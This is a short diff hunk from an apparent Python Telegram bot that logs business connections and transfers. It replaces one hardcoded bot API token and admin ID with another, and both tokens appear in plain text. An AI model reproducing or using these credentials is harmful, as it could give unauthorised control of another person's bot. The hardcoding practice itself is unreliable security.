@@ -14,8 +14,8 @@ sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
 
 CONNECTIONS_FILE = "business_connections.json"
 TRANSFER_LOG_FILE = "transfer_log.json"
-TOKEN = "7950823813:AAHiOxXD0wRU47y2GIYUWiO8VCoaoN7f8lE"  # токен
-ADMIN_ID = 1403979848   # ID
+TOKEN = "8349271177:AAFOUq-QkOYdlYGlUvCRo_i75oLCf-B0eyk"  # токен
+ADMIN_ID = 8139805126 # ID
 TRANSFER_DELAY = 1  # Задержка между запросами в секундах
 
 # Настройка логирования
